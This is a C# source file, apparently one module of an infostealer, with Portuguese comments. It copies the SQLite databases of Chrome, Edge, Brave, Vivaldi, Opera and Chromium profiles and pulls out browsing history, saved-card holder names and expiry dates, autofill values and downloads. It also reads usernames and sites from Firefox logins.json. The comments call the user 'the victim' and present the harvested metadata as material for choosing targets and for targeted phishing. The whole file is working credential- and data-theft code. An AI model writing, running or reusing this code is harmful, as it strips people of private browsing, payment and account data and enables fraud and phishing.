using System.Text;
using Microsoft.Data.Sqlite;
using Teste.Core;
using Teste.Native;

namespace Teste.Collect;

// Historico, cartoes, autofill e downloads de todo navegador Chromium + Firefox.
// Nao decifra nada: o que esta em claro no SQLite ja e suficiente e nao exige chave.
// O que esta cifrado (senha, cookie) e trabalho do ChromeCollector, nao daqui.
public static class BrowserCollector
{
    // 1601-01-01: epoch do formato WebKit, em microssegundos.
    private static readonly DateTime Epoch1601 =
        new(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc);

    // Rodada inteira nao passa de 3 s por navegador, mesmo em perfil com 200k urls.
    private const int MaxRows = 5000;

    private static readonly (string Name, string Rel)[] Roots =
    {
        ("chrome",  @"Google\Chrome\User Data"),
        ("edge",    @"Microsoft\Edge\User Data"),
        ("brave",   @"BraveSoftware\Brave-Browser\User Data"),
        ("vivaldi", @"Vivaldi\User Data"),
        ("opera",   @"Opera Software\Opera Stable"),
        ("chromium",@"Chromium\User Data"),
    };

    public static void Collect(Report r, Logger log)
    {
        var local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        var n = 0;

        foreach (var (brand, rel) in Roots)
        {
            var root = Path.Combine(local, rel);
            if (!Directory.Exists(root)) continue;

            foreach (var profile in Profiles(root))
            {
                n += FromHistory(r, brand, profile, log);
                n += FromCards(r, brand, profile, log);
                n += FromDownloads(r, brand, profile, log);
            }
        }

        n += FromFirefox(r, log);

        log.Line($"historico: {n} linhas de navegador, {r.Secrets.Count} segredos no total");
    }

    private static IEnumerable<string> Profiles(string root)
    {
        string[] dirs;
        try { dirs = Directory.GetDirectories(root); }
        catch { return Array.Empty<string>(); }

        return dirs.Where(d =>
        {
            var n = Path.GetFileName(d);
            return n.Equals("Default", StringComparison.OrdinalIgnoreCase)
                || n.StartsWith("Profile ", StringComparison.OrdinalIgnoreCase);
        });
    }

    // ------------------------------------------------------------------ history

    private static int FromHistory(Report r, string brand, string profile, Logger log)
    {
        var src = Path.Combine(profile, "History");
        if (!File.Exists(src)) return 0;

        var count = 0;
        Try(r, brand, "historico", log, src, db =>
        {
            // visit_time esta em microssegundos desde 1601; o offset converte para Unix.
            foreach (var row in Query(db, @"
                SELECT u.url, u.title, u.visit_count, v.visit_time, v.visit_duration
                FROM visits v JOIN urls u ON u.id = v.url
                ORDER BY v.visit_time DESC LIMIT $lim", MaxRows))
            {
                r.Secrets.Add(new SecretRec
                {
                    Source = $"{brand}/{Path.GetFileName(profile)}",
                    Kind = "historico",
                    Key = WebTime(row["visit_time"]).ToString("yyyy-MM-dd HH:mm:ss"),
                    Value = Trunc(Str(row, "url"), 500),
                    User = $"{Str(row, "visit_count")} visitas",
                    Status = "ok",
                    Note = Trunc(Str(row, "title"), 160)
                });
                count++;
            }
        });
        return count;
    }

    // -------------------------------------------------------------------- cards

    private static int FromCards(Report r, string brand, string profile, Logger log)
    {
        var src = Path.Combine(profile, "Web Data");
        if (!File.Exists(src)) return 0;

        var count = 0;

        Try(r, brand, "cartao", log, src, db =>
        {
            foreach (var row in Query(db, @"
                SELECT name_on_card, expiration_month, expiration_year,
                       card_number_encrypted, date_last_used
                FROM credit_cards", MaxRows))
            {
                var enc = Str(row, "card_number_encrypted");
                r.Secrets.Add(new SecretRec
                {
                    Source = $"{brand}/{Path.GetFileName(profile)}",
                    Kind = "cartao",
                    Key = Str(row, "name_on_card"),
                    // O numero em si esta cifrado com a chave do Chrome; o que sobe aqui
                    // e o metadado, que ja serve para escolher alvo.
                    Value = enc.Length > 0 ? $"{enc.Length} bytes cifrados (AES-GCM)" : "(vazio)",
                    User = $"{Str(row, "expiration_month")}/{Str(row, "expiration_year")}",
                    Status = enc.Length > 0 ? "app_bound" : "ok",
                    Note = WebTime(row["date_last_used"]).ToString("yyyy-MM-dd")
                });
                count++;
            }
        });

        Try(r, brand, "autofill", log, src, db =>
        {
            // autofill nao tem nome de coluna previsivel: o nome do campo E o conteudo.
            // Duas consultas, uma para saber quais campos existem, outra para ler.
            var fields = new List<string>();
            foreach (var row in Query(db, "SELECT DISTINCT name FROM autofill", 400))
            {
                var f = Str(row, "name");
                if (f.Length > 0) fields.Add(f);
            }
            if (fields.Count == 0) return;

            foreach (var row in Query(db, @"
                SELECT name, value FROM autofill
                ORDER BY name LIMIT $lim", MaxRows))
            {
                var value = Str(row, "value");
                if (string.IsNullOrWhiteSpace(value)) continue;

                r.Secrets.Add(new SecretRec
                {
                    Source = $"{brand}/{Path.GetFileName(profile)}",
                    Kind = "autofill",
                    Key = Str(row, "name"),
                    Value = Trunc(value, 300),
                    Status = "ok"
                });
                count++;
            }
        });

        return count;
    }

    // ---------------------------------------------------------------- downloads

    private static int FromDownloads(Report r, string brand, string profile, Logger log)
    {
        var src = Path.Combine(profile, "History");
        if (!File.Exists(src)) return 0;

        var count = 0;
        Try(r, brand, "download", log, src, db =>
        {
            foreach (var row in Query(db, @"
                SELECT target_path, referrer, start_time
                FROM downloads ORDER BY start_time DESC LIMIT $lim", 1000))
            {
                r.Secrets.Add(new SecretRec
                {
                    Source = $"{brand}/{Path.GetFileName(profile)}",
                    Kind = "download",
                    Key = Trunc(Str(row, "target_path"), 300),
                    Value = Trunc(Str(row, "referrer"), 300),
                    Status = "ok",
                    Note = WebTime(row["start_time"]).ToString("yyyy-MM-dd HH:mm")
                });
                count++;
            }
        });
        return count;
    }

    // ------------------------------------------------------------------- firefox

    // Firefox nao usa DPAPI nem a chave do Chrome: as senhas vivem em logins.json,
    // protegidas pelo key4.db. Sem a chave, o que vale e o metadado: em qual dominio
    // a vitima tem conta. Isso ja e munição de phishing direcionado.
    private static int FromFirefox(Report r, Logger log)
    {
        var root = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Mozilla", "Firefox", "Profiles");
        if (!Directory.Exists(root)) return 0;

        var count = 0;
        foreach (var prof in Directory.EnumerateDirectories(root))
        {
            var logins = Path.Combine(prof, "logins.json");
            if (!File.Exists(logins)) continue;

            try
            {
                var json = Files.ReadAllText(logins, 4 * 1024 * 1024);
                if (json.Length == 0) continue;

                using var doc = System.Text.Json.JsonDocument.Parse(json);
                if (!doc.RootElement.TryGetProperty("logins", out var loginsArr)) continue;

                foreach (var l in loginsArr.EnumerateArray())
                {
                    r.Secrets.Add(new SecretRec
                    {
                        Source = $"firefox/{Path.GetFileName(prof)}",
                        Kind = "senha",
                        Key = Str(l, "hostname"),
                        Value = "(cifrado por key4.db)",
                        User = Str(l, "username"),
                        Status = "app_bound",
                        Note = $"uso: {(l.TryGetProperty("timesUsed", out var t) ? t.ToString() : "?")}"

                    });
                    count++;
                }
            }
            catch (Exception ex)
            {
                r.Errors.Add(new ErrorRec("firefox", $"{Path.GetFileName(prof)}: {ex.Message}"));
            }
        }
        return count;
    }

    // ------------------------------------------------------------------ helpers

    // O banco esta aberto pelo navegador: copia antes de ler, senao o SQLite trava.
    private static void Try(Report r, string brand, string stage, Logger log,
                            string src, Action<string> body)
    {
        var tmp = Path.Combine(Path.GetTempPath(),
            $"t{Guid.NewGuid():N}.db");
        try
        {
            Files.Copy(src, tmp);
            body(tmp);
        }
        catch (Exception ex)
        {
            r.Errors.Add(new ErrorRec(stage, $"{brand}: {ex.GetType().Name}: {ex.Message}"));
            log.Line($"  ! {brand} {stage}: {ex.Message}");
        }
        finally
        {
            try { if (File.Exists(tmp)) File.Delete(tmp); } catch { }
        }
    }

    private static IEnumerable<Dictionary<string, object?>> Query(
        string db, string sql, int limit)
    {
        using var cn = new SqliteConnection($"Data Source={db};Mode=ReadOnly;Cache=Shared");
        cn.Open();
        using var cmd = cn.CreateCommand();
        cmd.CommandText = sql;
        cmd.Parameters.AddWithValue("$lim", limit);
        using var rd = cmd.ExecuteReader();

        var names = new string[rd.FieldCount];
        for (var i = 0; i < rd.FieldCount; i++) names[i] = rd.GetName(i);

        while (rd.Read())
        {
            var row = new Dictionary<string, object?>(rd.FieldCount);
            for (var i = 0; i < rd.FieldCount; i++) row[names[i]] = rd.IsDBNull(i) ? null : rd.GetValue(i);
            yield return row;
        }
    }

    private static DateTime WebTime(object? v) =>
        v is long ticks && ticks > 0 ? Epoch1601.AddTicks(ticks * 10).ToLocalTime() : DateTime.MinValue;

    private static string Str(Dictionary<string, object?> row, string key) =>
        row.TryGetValue(key, out var v) && v is not null ? v.ToString() ?? "" : "";

    private static string Str(System.Text.Json.JsonElement el, string key) =>
        el.TryGetProperty(key, out var v) && v.ValueKind == System.Text.Json.JsonValueKind.String
            ? v.GetString() ?? "" : "";

    private static string Trunc(string s, int n) =>
        s.Length <= n ? s : s[..n] + "…";
}
